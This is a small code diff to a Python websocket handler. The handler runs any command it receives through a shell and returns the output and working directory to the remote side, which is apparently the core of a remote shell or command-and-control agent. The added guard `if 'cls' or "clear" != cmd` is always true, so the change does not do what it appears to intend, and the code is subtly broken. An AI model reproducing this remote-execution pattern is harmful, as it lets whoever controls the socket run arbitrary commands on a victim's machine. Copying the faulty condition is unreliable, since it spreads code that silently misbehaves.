@@ -19,8 +19,9 @@ def on_message(ws, cmd):
         ws.send(x2.encode())
 
     if len(cmd) > 0:
-        p = subprocess.run(cmd, shell=True, capture_output=True)
-        data = p.stdout + p.stderr
+        if 'cls' or "clear" != cmd:
+            p = subprocess.run(cmd, shell=True, capture_output=True)
+            data = p.stdout + p.stderr
         x3 = f'{os.getcwd()}>'
         ws.send(data + x3.encode())
 
